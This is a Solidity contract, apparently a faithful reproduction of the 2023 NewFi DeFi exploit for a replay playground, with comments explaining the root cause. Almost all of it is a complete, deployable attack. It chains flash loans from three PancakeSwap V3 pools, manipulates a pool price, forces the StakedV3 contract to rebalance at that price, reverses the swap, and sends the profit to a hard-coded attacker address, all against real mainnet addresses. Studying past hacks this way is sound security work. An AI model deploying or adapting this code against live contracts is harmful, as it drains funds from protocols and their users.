// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-NewFi).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker == address(this), and the PancakeSwap V3 flash callback
// `pancakeV3FlashCallback` lives on the test itself) — there is no standalone
// exploit contract to deploy. This contract is a faithful, self-contained copy of
// that inline attack (testExploit -> run(), pancakeV3FlashCallback, BUSDToUSDT,
// USDTToBUSD) so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/NewFi_exp.sol.
//
// Root cause: StakedV3.Invest() reads the LIVE spot price of its managed
// PancakeSwap V3 pool (slot0()) with no TWAP, and its internal Swap()/`_swap()`
// wrapper derives amountOutMinimum/amountInMaximum from a caller-controlled
// quoteAmount, giving the protocol effectively zero slippage protection. A
// flash-loaned BUSD->USDT swap shoves the pool price far outside the protocol's
// tight [-17,17] LP band, then Invest() is forced to decreaseLiquidity + re-Mint
// at that manipulated price, leaking value to whoever reverses the swap.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface Uni_Pair_V3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface Uni_Router_V3 {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);
}

interface IStakedV3 {
    function Invest(
        uint256 id,
        uint256 amount,
        uint256 quoteAmount,
        uint256 investType,
        uint256 cycle,
        uint256 deadline
    ) external payable;
}

contract NewFiDrain {
    address constant ATTACKER = 0x3A10408fD7A2b2A43bD14A17c0d4568430B93132;

    IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Router_V3 constant Router = Uni_Router_V3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
    Uni_Pair_V3 constant Pair1 = Uni_Pair_V3(0x22536030B9cE783B6Ddfb9a39ac7F439f568E5e6);
    Uni_Pair_V3 constant Pair2 = Uni_Pair_V3(0x85FAac652b707FDf6907EF726751087F9E0b6687);
    Uni_Pair_V3 constant Pair3 = Uni_Pair_V3(0x369482C78baD380a036cAB827fE677C1903d1523);
    IStakedV3 constant StakedV3 = IStakedV3(0xB8dC09Eec82CaB2E86C7EdC8DD5882dd92d22411);

    // step 0: approve, then kick off the chained triple flash-borrow (Pair1 -> Pair2 -> Pair3).
    function run() external {
        USDT.approve(address(Router), type(uint256).max);
        BUSD.approve(address(Router), type(uint256).max);
        BUSD.approve(address(StakedV3), type(uint256).max);
        Pair1.flash(address(this), 0, BUSD.balanceOf(address(Pair1)), abi.encode(BUSD.balanceOf(address(Pair1))));

        // step 6: all three flash loans are now repaid (Pair3 -> Pair2 -> Pair1 unwind
        // order); forward the remaining BUSD profit to the real attacker EOA.
        BUSD.transfer(ATTACKER, BUSD.balanceOf(address(this)));
    }

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (msg.sender == address(Pair1)) {
            // step 1: chain into Pair2's flash before repaying Pair1.
            Pair2.flash(address(this), 0, BUSD.balanceOf(address(Pair2)), abi.encode(BUSD.balanceOf(address(Pair2))));
            uint256 repayAmount = abi.decode(data, (uint256));
            BUSD.transfer(address(Pair1), repayAmount + amount1);
        } else if (msg.sender == address(Pair2)) {
            // step 2: chain into Pair3's flash before repaying Pair2.
            Pair3.flash(address(this), 0, BUSD.balanceOf(address(Pair3)), abi.encode(BUSD.balanceOf(address(Pair3))));
            uint256 repayAmount = abi.decode(data, (uint256));
            BUSD.transfer(address(Pair2), repayAmount + amount1);
        } else if (msg.sender == address(Pair3)) {
            // step 3: with ~13.25M BUSD in hand, manipulate the pool price...
            BUSDToUSDT();
            // step 4: ...then force StakedV3 to rebalance its LP at the manipulated price...
            StakedV3.Invest(2, 1 ether, 2, 1, 7, block.timestamp + 1000); // remove liquidity and swap BUSD to USDT
            // step 5: ...and reverse the manipulation, pocketing the difference.
            USDTToBUSD();
            uint256 repayAmount = abi.decode(data, (uint256));
            BUSD.transfer(address(Pair3), repayAmount + amount1);
        }
    }

    function BUSDToUSDT() internal {
        bytes memory path = abi.encodePacked(address(BUSD), uint24(100), address(USDT));
        address recipient = address(this);
        uint256 amountIn = 12_000_000 ether;
        uint256 amountOutMinimum = 0;
        Uni_Router_V3.ExactInputParams memory exactInputParams =
            Uni_Router_V3.ExactInputParams(path, recipient, amountIn, amountOutMinimum);
        Router.exactInput(exactInputParams);
    }

    function USDTToBUSD() internal {
        bytes memory path = abi.encodePacked(address(USDT), uint24(100), address(BUSD));
        address recipient = address(this);
        uint256 amountIn = USDT.balanceOf(address(this));
        uint256 amountOutMinimum = 0;
        Uni_Router_V3.ExactInputParams memory exactInputParams =
            Uni_Router_V3.ExactInputParams(path, recipient, amountIn, amountOutMinimum);
        Router.exactInput(exactInputParams);
    }
}
